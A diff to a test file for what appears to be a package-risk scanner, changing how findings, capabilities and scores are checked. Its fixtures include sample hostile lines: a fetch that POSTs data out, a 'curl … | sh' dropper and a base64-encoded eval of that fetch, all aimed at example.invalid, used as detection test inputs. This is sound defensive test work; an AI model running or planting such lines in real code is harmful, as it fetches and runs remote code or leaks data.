@@ -3,7 +3,7 @@
 // signal's confidence and points, not only that it is there: a detection that slips to "possible" costs a third of
 // the points, which is how a package climbs back over the floor.
 import { describe, expect, test } from "bun:test";
-import { analyze, finalize, NOT_CHECKED, POINTS, POSSIBLE_POINTS, SCORE_FLOOR, typoConflicts, type Analysis, type SignalId, type TarEntry } from "../src/index.ts";
+import { analyze, finalize, NOT_CHECKED, POINTS, POSSIBLE_POINTS, SCORE_FLOOR, typoConflicts, type Analysis, type SignalId, type TarEntry, findingsOf } from "../src/index.ts";
 
 const FETCH = "fetch('https://example.invalid/c', { method: 'POST', body: 'x' });\n";
 const DROPPER = "curl -s https://example.invalid/x.sh | sh";
@@ -25,18 +25,24 @@ function analyzePkg(p: Pkg): Analysis {
 }
 
 function ids(a: Analysis): string[] {
-  return a.signals.map((s) => s.id);
+  return findingsOf(a).map((s) => s.id);
 }
 
 const possiblePoints = new Map<string, number>(Object.entries(POSSIBLE_POINTS));
 
-/** The signal is there, as sure as `confidence`, and costs what that confidence costs. */
+/**
+ * The finding is there, as sure as `confidence`. A capability (apm-score-v10) costs nothing; a finding that is a risk
+ * signal costs what that signal and confidence cost.
+ */
 function expectSignal(a: Analysis, id: SignalId, confidence: "confirmed" | "possible" = "confirmed"): void {
-  const s = a.signals.find((x) => x.id === id);
+  const s = findingsOf(a).find((x) => x.id === id);
 
   expect(s, `${id} in ${ids(a).join(",")}`).toBeDefined();
   expect(s?.confidence, id).toBe(confidence);
-  expect(s?.points, id).toBe(confidence === "confirmed" ? POINTS[id] : possiblePoints.get(id));
+  const scored = a.signals.find((x) => x.label === s?.label && x.evidence === s?.evidence);
+
+  if (!scored) expect(s?.points, `${id} is a capability`).toBe(0);
+  else expect(s?.points, id).toBe(confidence === "confirmed" ? POINTS[scored.id] : possiblePoints.get(scored.id));
 }
 
 function scoreOf(a: Analysis): number {
@@ -106,7 +112,7 @@ describe("3. files the require graph does not reach", () => {
 
   test("require probes .node and index.cjs the way node does", () => {
     const a = analyzePkg({ files: { "index.js": "require('./native');\nrequire('./lib');\n", "native.node": "\x7fELF....", "lib/index.cjs": FETCH } });
-    expect(a.signals.find((s) => s.id === "binary")?.evidence).toContain("native.node");
+    expect(findingsOf(a).find((s) => s.id === "binary")?.evidence).toContain("native.node");
     expectSignal(a, "network");
   });
 });
@@ -290,7 +296,8 @@ describe("9. obfuscation", () => {
     const a = analyzePkg({ files: { "index.js": `eval(atob('${Buffer.from(FETCH).toString("base64")}'));\n` } });
 
     for (const id of ["eval", "network", "obfuscated"] as const) expectSignal(a, id);
-    expect(scoreOf(a)).toBe(70);
+    // apm-score-v10: running a decoded payload (-25), the name it hides (-20), obfuscated code that uses the network (-15)
+    expect(scoreOf(a)).toBe(40);
   });
 
   test("a name built from char codes is called obfuscated", () => {
